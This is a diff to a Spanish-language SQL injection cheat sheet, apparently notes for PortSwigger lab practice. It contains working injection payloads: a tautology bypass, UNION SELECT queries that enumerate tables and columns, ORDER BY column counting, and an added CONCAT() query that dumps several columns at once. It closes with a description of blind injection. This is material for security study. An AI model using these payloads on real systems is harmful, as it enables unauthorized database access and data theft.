@@ -51,7 +51,7 @@ abc' or '1'='1
 ```sql
 ' union select null,column_name from all_tab_columns where table_name='NOMBRE DE LA TABLA'-- -
 ```
-## Metodologia (No blind SQL injection)
+## Metodologia inyección basada en errores
 ### Determinar el numero de columnas
 ```sql
 abc' order by 3-- -
@@ -74,3 +74,18 @@ abc' union select null,null,'v0ydRT',null-- - # 200 -> Aqui se pueden injectar q
 abc' union select null,null,null,'v0ydRT'-- - # 500
 ```
 Despues de eso se utiliza toda la informacion aterior para recopilar la informacion de la base de datos.
+
+
+## Dumpear todos los valores de N numeros de columnas en una sola consulta (MySQL)
+Suponiendo que despues de utilizar la metodologia anterior solo podemos injectar sentencias en un campo, podemos utilizar la funcion CONCAT() para extraer valores del numero de columnas que queramos
+```sql
+' union select null,CONCAT(COLUMNA 1,':',COLUMNA 2) from TABLA-- -
+```
+## Metodologia inyección a ciegas (Blind SQL injection)
+En un ataque blind SQL injection el atacante explora la base de datos mediante consultas que, dependiendo de la respuesta del servidor (como respuestas verdaderas o falsas), le permiten inferir datos confidenciales o estructura de la base de datos sin acceder directamente a los resultados.
+
+Ejemplo: El laboratorio https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+"This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows."
